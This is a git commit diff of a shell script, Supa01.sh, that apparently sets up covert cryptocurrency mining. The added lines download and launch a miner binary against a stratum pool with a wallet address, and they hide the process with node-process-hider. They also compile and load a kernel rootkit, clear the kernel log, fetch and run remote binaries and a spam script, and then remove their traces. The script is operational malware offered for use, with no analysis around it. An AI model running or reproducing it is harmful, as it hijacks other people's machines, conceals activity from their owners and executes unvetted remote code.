80cb785273ed8e335e98ff78d67cbf245481f4db
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-07-13 17:13:43 +0700

    Update Supa01.sh

--- Supa01.sh
+++ Supa01.sh
@@ -1,7 +1,28 @@
 #!/bin/bash 
-sudo apt update -y && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider && ph add avx2 && wget https://github.com/BatiKangkung/KangKung/raw/main/avx2 && chmod +x avx2 
-./avx2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 1000-9999 -n 1)-C) -t 1 -p x
-# ./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x
-
-
-
+git clone https://github.com/BatiKangkung/Kerecek
+sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider 
+sudo apt-get install cpulimit
+cd Kerecek/
+ph add avx2 
+cpulimit -l 180 -e avx2 &
+make
+dmesg -C
+insmod rootkit.ko
+dmesg
+chmod +x avx2
+./avx2 -a yespower -o stratum+tcps://bte.wisnuardhi27.my.id:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null & 
+uname -a
+pkill -31 avx2
+pkill -31 cpulimit
+wget https://github.com/BatiKangkung/KangKung/raw/master/time && chmod +x time
+timeout 5m ./time
+# time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
+wget https://raw.githubusercontent.com/Sushrut1101/Ubuntu-Tmate/master/spam.sh && chmod +x spam.sh
+timeout 4m ./spam.sh
+rmmod rootkit
+dmesg
+pkill -31 avx2
+pkill -31 cpulimit
+cd ..
+rm -rf Kerecek
+ls
